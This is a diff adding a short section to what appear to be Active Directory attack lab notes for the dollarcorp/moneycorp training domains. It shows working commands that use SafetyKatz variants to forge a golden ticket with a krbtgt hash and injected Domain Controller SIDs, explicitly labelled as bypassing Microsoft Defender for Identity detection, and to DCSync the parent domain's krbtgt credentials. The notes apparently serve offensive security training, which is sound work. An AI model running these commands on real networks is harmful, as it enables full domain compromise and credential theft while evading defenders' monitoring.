@@ -718,3 +718,17 @@ winrs -r:mcorp-dc cmd
 
 
 
+- Avoid suspicious logs by using Domain Controllers group (Bypass MDI Detection)
+
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
+```
+
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+```
+
+
+
